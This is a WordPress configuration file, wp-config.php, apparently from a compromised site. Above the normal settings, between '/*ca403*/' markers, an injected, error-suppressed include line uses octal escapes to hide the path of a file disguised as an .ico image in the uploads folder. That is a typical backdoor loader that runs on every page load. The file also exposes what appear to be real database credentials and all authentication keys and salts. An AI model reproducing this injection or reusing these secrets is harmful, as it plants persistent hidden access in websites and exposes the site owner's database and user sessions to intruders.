<?php
/*ca403*/

@include "\104:\057W\105B\057R\111I\116G\116E\124/\167p\055c\157n\164e\156t\057u\160l\157a\144s\0572\0601\065/\056e\063c\070e\1450\070.\151c\157";

/*ca403*/

/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress487');

/** MySQL database username */
define('DB_USER', 'wordpressuser487');

/** MySQL database password */
define('DB_PASSWORD', '0Us#-oyqEdu#');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

define('DISALLOW_FILE_EDIT', true);

/* define('WP_HOME', 'http://ri-ing.net');
define('WP_SITEURL', 'http://ri-ing.net'); */

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '#%/>#iqBa_M58YuIE<{O^d5g}M9X[ssP oek ~co1(mpmcw(4XFtC0-jQ5D-%(4C');
define('SECURE_AUTH_KEY',  'y09qF!y;XY**TLlrO{P=~AcAI[?vJp2?.&@e($j6,z4qsuJ?,.p+,]R95c}qSIZ}');
define('LOGGED_IN_KEY',    'q0`)&egiAIuNKB7{;jQ8GXW>Np}??H,k!70X3Kh6iWB61i3yMH>BQU 2;Tbu3b^f');
define('NONCE_KEY',        '%Fn%F G{>42*I2l,&EZlydrd#7`&U *lbjQQA]ILdI,r3Edk*Xl%M0K|nYFPPrJ^');
define('AUTH_SALT',        '$#=CHi7@]=f)Y/8C|F+E>;t]j>`^fe;#kJbNJ@%k~y0{Ev:$q,!_0 _4Q8LvYj.O');
define('SECURE_AUTH_SALT', '6M,Mp;KvD))VyV[!3gT9b.&7:(%y>u7NcA;J-L@1g6FG3Jd,J%&Y*v-7P<j[q*6d');
define('LOGGED_IN_SALT',   'U-IU-50W6jxZo0HmtY37Ytc:PUh00I^_*G6wA=!g24ImW>QS{egbiYS`:vL8+GHG');
define('NONCE_SALT',       'z-,l`sii4zf>=5N,#;<n5w{dQu/-IPMbPIoaQxup^n#M,V]}eEq@]/QJ3h{@S4t!');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);
define( 'WP_DEBUG_LOG', false );
define( 'WP_DEBUG_DISPLAY', false );

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

